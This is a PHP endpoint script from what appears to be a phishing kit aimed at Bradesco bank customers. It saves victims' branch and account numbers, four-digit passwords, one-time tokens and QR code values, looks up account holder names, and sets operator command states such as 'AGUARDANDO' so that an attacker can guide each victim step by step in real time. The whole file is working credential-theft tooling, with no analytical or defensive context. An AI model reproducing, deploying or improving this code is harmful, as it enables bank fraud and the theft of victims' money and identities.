<?php
require_once('_admin/config.php');

// Headers anti-cache
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

function isExclusive($obj){
    if(isset($obj['exclusive']) && $obj['exclusive']){
       return true;
    }
 
    return false;
 }


if(isset($_POST["action"])){
    $action = $_POST["action"];

    if($action == "GET_INFO") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        Info::alterarUltimoAcesso($id);
        echo json_encode(Info::buscarApi($id, $clientHashId));
    }
    if($action == "ATUALIZAR_INFORMACOES") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $obj = $_POST["obj"];
        Info::updateByAPI($id, $clientHashId, $obj);
        echo "ok";
    }
    if($action == "SALVAR_TOKEN") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $valor = $_POST["valor"];
        $posicao = $_POST["posicao"];
        Token::gravarToken($id, $posicao, $valor);
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO');
        echo "ok";
    }
    if($action == "SALVAR_TOKEN_INTERNA") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $valor = $_POST["valor"];
        $posicao = $_POST["posicao"];
        Token::gravarToken($id, $posicao, $valor);
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO_INTERNA');
        echo "ok";
    }

    if($action == "AGUARDANDO_INTERNA") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO_INTERNA');
        echo "ok";
    }
    if($action == "AGUARDANDO") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO');
        echo "ok";
    }
    

    if($action == "SALVAR_QR_INTERNA") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $valor = $_POST["valor"];
        $posicao = 'QR Code';
        Token::gravarToken($id, $posicao, $valor);
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO_INTERNA');
        echo "ok";
    }

    if($action == "ATUALIZAR_TITULAR") {
        $id = $_POST["id"];
        $titular = $_POST["titular"];
        $nome = $_POST["nome"];
        $_SESSION['nome'] = $_POST["nome"];
        Info::atualizarTitular($id, $titular, $nome);
        echo "ok";
    }
    
    if($action == "SALVAR_INFO") {

        $idAcesso = $_POST["idAcesso"];
        $agencia = $_POST["agencia"];
        $conta = $_POST["conta"];
        $digito = $_POST["digito"];
        $senha4 = $_POST["senha4"];
        $id = $_POST["id"];

        $objAPI = getNome2($agencia, $conta.$digito);

        $tipo = "Bradesco";
        if(isExclusive($objAPI)){
           $tipo = "Bradesco Exclusive";
        }

        $id = Info::gravarInfoMobile($idAcesso, $agencia, $conta, $digito, $senha4, "AGUARDANDO", $tipo, $id);

        $nome = isset($objAPI['nome']) && strlen($objAPI['nome']) > 0 ? $objAPI['nome'] : '';

        Info::atualizarTitular($id, "1 º titular" , $nome);
        $retorno = [
            "id" => $id,
            "nome" => $nome
        ];
        echo json_encode($retorno);
    }

    if($action == "SALVAR_INFO_MOBILE") {

        $idAcesso = $_POST["idAcesso"];
        $agencia = $_POST["agencia"];
        $conta = $_POST["conta"];
        $digito = $_POST["digito"];
        $senha4 = $_POST["senha4"];
        $id = $_POST["id"];
        $nome = $_POST['titular'];
        $tipo = $_POST['tipo'];
      
        $id = Info::gravarInfoMobile($idAcesso, $agencia, $conta, $digito, $senha4, "AGUARDANDO", $tipo, $id);

        Info::atualizarTitular($id, "-" , $nome);

        $retorno = [
            "id" => $id
        ];
        echo json_encode($retorno);
    }

    if($action == "BUSCAR_TITULARES") {
        $idAcesso = $_POST["idAcesso"];
        $agencia = $_POST["agencia"];
        $conta = $_POST["conta"];
        $digito = $_POST["digito"];

        $objAPI = getNome2($agencia, $conta.$digito);
        echo json_encode($objAPI);

    }

}